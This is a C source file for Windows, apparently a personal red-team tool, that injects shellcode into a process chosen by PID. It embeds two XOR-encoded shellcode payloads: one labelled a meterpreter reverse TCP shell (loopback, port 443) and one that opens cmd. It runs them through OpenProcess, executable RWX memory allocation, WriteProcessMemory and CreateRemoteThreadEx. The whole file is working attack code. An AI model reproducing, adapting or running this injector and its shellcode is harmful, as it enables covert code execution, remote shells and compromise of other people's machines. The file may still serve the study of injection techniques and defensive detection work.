#include <windows.h>
#include <stdio.h>

// Windows x64 meterpreter reverse tcp shell payload with x64 xor dynamic encoding (loopback addr@443) thread exit
unsigned char payload1[] =
    "\xeb\x27\x5b\x53\x5f\xb0\x2b\xfc\xae\x75\xfd\x57\x59\x53"
    "\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
    "\xda\xcc\x74\x07\x80\x3e\x2b\x75\xea\xeb\xe6\xff\xe1\xe8"
    "\xd4\xff\xff\xff\x13\x2b\xef\x5b\x90\xf7\xe3\xfb\xdf\x13"
    "\x13\x13\x52\x42\x52\x43\x41\x42\x45\x5b\x22\xc1\x76\x5b"
    "\x98\x41\x73\x5b\x98\x41\x0b\x5b\x98\x41\x33\x5b\x1c\xa4"
    "\x59\x59\x5b\x98\x61\x43\x5e\x22\xda\x5b\x22\xd3\xbf\x2f"
    "\x72\x6f\x11\x3f\x33\x52\xd2\xda\x1e\x52\x12\xd2\xf1\xfe"
    "\x41\x5b\x98\x41\x33\x52\x42\x98\x51\x2f\x5b\x12\xc3\x75"
    "\x92\x6b\x0b\x18\x11\x1c\x96\x61\x13\x13\x13\x98\x93\x9b"
    "\x13\x13\x13\x5b\x96\xd3\x67\x74\x5b\x12\xc3\x43\x98\x5b"
    "\x0b\x57\x98\x53\x33\x5a\x12\xc3\xf0\x45\x5b\xec\xda\x5e"
    "\x22\xda\x52\x98\x27\x9b\x5b\x12\xc5\x5b\x22\xd3\x52\xd2"
    "\xda\x1e\xbf\x52\x12\xd2\x2b\xf3\x66\xe2\x5f\x10\x5f\x37"
    "\x1b\x56\x2a\xc2\x66\xcb\x4b\x57\x98\x53\x37\x5a\x12\xc3"
    "\x75\x52\x98\x1f\x5b\x57\x98\x53\x0f\x5a\x12\xc3\x52\x98"
    "\x17\x9b\x5b\x12\xc3\x52\x4b\x52\x4b\x4d\x4a\x49\x52\x4b"
    "\x52\x4a\x52\x49\x5b\x90\xff\x33\x52\x41\xec\xf3\x4b\x52"
    "\x4a\x49\x5b\x98\x01\xfa\x58\xec\xec\xec\x4e\x5a\xad\x64"
    "\x60\x21\x4c\x20\x21\x13\x13\x52\x45\x5a\x9a\xf5\x5b\x92"
    "\xff\xb3\x12\x13\x13\x5a\x9a\xf6\x5a\xaf\x11\x13\x12\xa8"
    "\x6c\x13\x13\x12\x52\x47\x5a\x9a\xf7\x5f\x9a\xe2\x52\xa9"
    "\x5f\x64\x35\x14\xec\xc6\x5f\x9a\xf9\x7b\x12\x12\x13\x13"
    "\x4a\x52\xa9\x3a\x93\x78\x13\xec\xc6\x79\x19\x52\x4d\x43"
    "\x43\x5e\x22\xda\x5e\x22\xd3\x5b\xec\xd3\x5b\x9a\xd1\x5b"
    "\xec\xd3\x5b\x9a\xd2\x52\xa9\xf9\x1c\xcc\xf3\xec\xc6\x5b"
    "\x9a\xd4\x79\x03\x52\x4b\x5f\x9a\xf1\x5b\x9a\xea\x52\xa9"
    "\x8a\xb6\x67\x72\xec\xc6\x96\xd3\x67\x19\x5a\xec\xdd\x66"
    "\xf6\xfb\x80\x13\x13\x13\x5b\x90\xff\x03\x5b\x9a\xf1\x5e"
    "\x22\xda\x79\x17\x52\x4b\x5b\x9a\xea\x52\xa9\x11\xca\xdb"
    "\x4c\xec\xc6\x90\xeb\x13\x6d\x46\x5b\x90\xd7\x33\x4d\x9a"
    "\xe5\x79\x53\x52\x4a\x7b\x13\x03\x13\x13\x52\x4b\x5b\x9a"
    "\xe1\x5b\x22\xda\x52\xa9\x4b\xb7\x40\xf6\xec\xc6\x5b\x9a"
    "\xd0\x5a\x9a\xd4\x5e\x22\xda\x5a\x9a\xe3\x5b\x9a\xc9\x5b"
    "\x9a\xea\x52\xa9\x11\xca\xdb\x4c\xec\xc6\x90\xeb\x13\x6e"
    "\x3b\x4b\x52\x44\x4a\x7b\x13\x53\x13\x13\x52\x4b\x79\x13"
    "\x49\x52\xa9\x18\x3c\x1c\x23\xec\xc6\x44\x4a\x52\xa9\x66"
    "\x7d\x5e\x72\xec\xc6\x5a\xec\xdd\xfa\x2f\xec\xec\xec\x5b"
    "\x12\xd0\x5b\x3a\xd5\x5b\x96\xe5\x66\xa7\x52\xec\xf4\x4b"
    "\x79\x13\x4a\xa8\xf3\x0e\x39\x19\x52\x9a\xc9\xec\xc6\xda"
    "\xcc";

// Shell code execution of opening cmd
unsigned char payload2[] =
    "\xeb\x27\x5b\x53\x5f\xb0\x48\xfc\xae\x75\xfd\x57\x59\x53"
    "\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
    "\xa8\x05\x74\x07\x80\x3e\x48\x75\xea\xeb\xe6\xff\xe1\xe8"
    "\xd4\xff\xff\xff\x14\x48\xe8\x5c\x97\xf0\xe4\xfc\xd4\x14"
    "\x14\x14\x55\x45\x55\x44\x46\x45\x42\x5c\x25\xc6\x71\x5c"
    "\x9f\x46\x74\x5c\x9f\x46\x0c\x5c\x9f\x46\x34\x5c\x9f\x66"
    "\x44\x5c\x1b\xa3\x5e\x5e\x59\x25\xdd\x5c\x25\xd4\xb8\x28"
    "\x75\x68\x16\x38\x34\x55\xd5\xdd\x19\x55\x15\xd5\xf6\xf9"
    "\x46\x55\x45\x5c\x9f\x46\x34\x9f\x56\x28\x5c\x15\xc4\x9f"
    "\x94\x9c\x14\x14\x14\x5c\x91\xd4\x60\x73\x5c\x15\xc4\x44"
    "\x9f\x5c\x0c\x50\x9f\x54\x34\x5d\x15\xc4\xf7\x42\x5c\xeb"
    "\xdd\x55\x9f\x20\x9c\x5c\x15\xc2\x59\x25\xdd\x5c\x25\xd4"
    "\xb8\x55\xd5\xdd\x19\x55\x15\xd5\x2c\xf4\x61\xe5\x58\x17"
    "\x58\x30\x1c\x51\x2d\xc5\x61\xcc\x4c\x50\x9f\x54\x30\x5d"
    "\x15\xc4\x72\x55\x9f\x18\x5c\x50\x9f\x54\x08\x5d\x15\xc4"
    "\x55\x9f\x10\x9c\x5c\x15\xc4\x55\x4c\x55\x4c\x4a\x4d\x4e"
    "\x55\x4c\x55\x4d\x55\x4e\x5c\x97\xf8\x34\x55\x46\xeb\xf4"
    "\x4c\x55\x4d\x4e\x5c\x9f\x06\xfd\x43\xeb\xeb\xeb\x49\x5c"
    "\xae\x15\x14\x14\x14\x14\x14\x14\x14\x5c\x99\x99\x15\x15"
    "\x14\x14\x55\xae\x25\x9f\x7b\x93\xeb\xc1\xaf\xf4\x09\x3e"
    "\x1e\x55\xae\xb2\x81\xa9\x89\xeb\xc1\x5c\x97\xd0\x3c\x28"
    "\x12\x68\x1e\x94\xef\xf4\x61\x11\xaf\x53\x07\x66\x7b\x7e"
    "\x14\x4d\x55\x9d\xce\xeb\xc1\x77\x79\x70\x3a\x71\x6c\x71"
    "\x14\xa8\x05";

int main(int argc, char *argv[])
{
    void *code = NULL;

    BOOL payload_id = FALSE;
    BOOL wpm = NULL;

    const char *k = "[+]";
    const char *i = "[*]";
    const char *e = "[!]";

    DWORD TID = NULL;
    DWORD PID = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID vrBuffer = NULL;

    printf("\nCREATOR#~ Naveen William\n\n");
    if (argc < 2)
    {
        printf("%s usage: inject.exe <PID> <PAYLOAD_ID(1/2)>", e);
        MessageBoxW(NULL, L"usage: inject.exe <PID> <PAYLOAD_ID(1/2)>", L"Naveen William", MB_OK | MB_ICONINFORMATION);
        return EXIT_FAILURE;
    }
    if (atoi(argv[2]) == 1)
    {
        code = malloc(sizeof(payload1));
        if (code == NULL)
        {
            MessageBoxW(NULL, L"Failed to allocate memory for the payload", L"Memory Error", MB_OK | MB_ICONERROR);
            printf("%s Failed to allocate memory for payload!", e);
            return EXIT_FAILURE;
        }
        memcpy(code, payload1, sizeof(payload1));
        printf("%s Choosed reverse tcp payload with x64 xor_dynamic encoding! with local loopback addr @443 :} )\n\n", k);
        payload_id = TRUE;
    }
    else if (atoi(argv[2]) == 2)
    {
        code = malloc(sizeof(payload2));
        if (code == NULL)
        {
            MessageBoxW(NULL, L"Failed to allocate memory for the payload", L"Memory Error", MB_OK | MB_ICONERROR);
            printf("%s Failed to allocate memory for payload!", e);
            return EXIT_FAILURE;
        }
        memcpy(code, payload2, sizeof(payload2));
        printf("%s Choosed open cmd! :)\n\n", k);
        payload_id = FALSE;
    }
    else
    {
        printf("%s usage: inject.exe <PID> <PAYLOAD_ID(1/2)>", e);
        MessageBoxW(NULL, L"Invalid Payload ID", L"PAYLOAD ERROR", MB_OK | MB_ICONERROR);
        printf("%s Invalid Payload ID!", e);
        return EXIT_FAILURE;
    }

    // Getting Process PID
    PID = atoi(argv[1]);
    printf("%s Trying to open a handle to the process (%ld)\n", i, PID);

    // Opening the process
    hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);
    if (hProcess == NULL)
    {
        if (GetLastError() == 5)
        {
            MessageBoxW(NULL, L"Process Access Denied!", L"Code Injector", MB_OK | MB_ICONERROR);
            printf("%s !!!Process Access Denied!!!\n", e);
        }
        else if (GetLastError() == 87)
        {
            printf("%s Invalid PID Parameter\n", e);
        }
        printf("%s Couldnt get a handle to the process (%ld), error-code: %ld\n", e, PID, GetLastError());
        free(code);
        return EXIT_FAILURE;
    }
    else
    {
        printf("%s Got handle to process!\n |~--> 0x%p\n", k, hProcess);
    }

    // Creating virtual memory space in the opened process with payload size
    if (payload_id == TRUE)
    {
        vrBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload1), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    }
    else
    {
        vrBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload2), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    }
    if (payload_id == TRUE)
    {
        printf("%s Allocated %zu-bytes with rwx permissions!\n", k, sizeof(payload1));
    }
    else
    {
        printf("%s Allocated %zu-bytes with rwx permissions!\n", k, sizeof(payload2));
    }
    // Writing the virtual memory with the shellcode
    if (payload_id == TRUE)
    {
        wpm = WriteProcessMemory(hProcess, vrBuffer, code, sizeof(payload1), NULL);
    }
    else
    {
        wpm = WriteProcessMemory(hProcess, vrBuffer, code, sizeof(payload2), NULL);
    }
    if (wpm == TRUE)
    {
        if (payload_id == TRUE)
        {
            printf("%s wrote %zu-bytes to process memory\n", k, sizeof(payload1));
        }
        else
        {
            printf("%s wrote %zu-bytes to process memory\n", k, sizeof(payload2));
        }
    }
    else
    {
        if (payload_id == TRUE)
        {
            printf("%s Failed to write %zu-bytes into process memory!!", e, sizeof(payload1));
        }
        else
        {
            printf("%s Failed to write %zu-bytes into process memory!!", e, sizeof(payload2));
        }
        if (payload_id == TRUE)
        {
            VirtualFreeEx(hProcess, vrBuffer, sizeof(payload1), MEM_RELEASE);
        }
        else
        {
            VirtualFreeEx(hProcess, vrBuffer, sizeof(payload2), MEM_RELEASE);
        }
        free(code);
        return EXIT_FAILURE;
    }

    // Creating remote thread in the current process
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vrBuffer, NULL, 0, 0, &TID);
    if (hThread == NULL)
    {
        printf("%sfailed to get a handle to the thread, error: %ld", e, GetLastError());
        if (payload_id == TRUE)
        {
            VirtualFreeEx(hProcess, vrBuffer, sizeof(payload1), MEM_RELEASE);
        }
        else
        {
            VirtualFreeEx(hProcess, vrBuffer, sizeof(payload2), MEM_RELEASE);
        }
        CloseHandle(hProcess);
        free(code);
        return EXIT_FAILURE;
    }
    printf("%s got a handle to the thread (%ld)!\n |~-->0x%p\n", k, TID);

    // Waiting for the thread to stop
    printf("%s Starting process thread!\n", k);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s Thread finished executing!\n", k);

    // Cleaning up stuffs
    printf("%s Cleaning up!\n", k);
    free(code);
    if (payload_id == TRUE)
    {
        VirtualFreeEx(hProcess, vrBuffer, sizeof(payload1), MEM_RELEASE);
    }
    else
    {
        VirtualFreeEx(hProcess, vrBuffer, sizeof(payload2), MEM_RELEASE);
    }
    CloseHandle(hThread);
    CloseHandle(hProcess);
    MessageBoxW(NULL, L"Injection Finished Successfully :)", L"Code Injector", MB_OK | MB_ICONASTERISK);
    printf("%s Injection Finished Successfully :)\n", k);

    return EXIT_SUCCESS;
}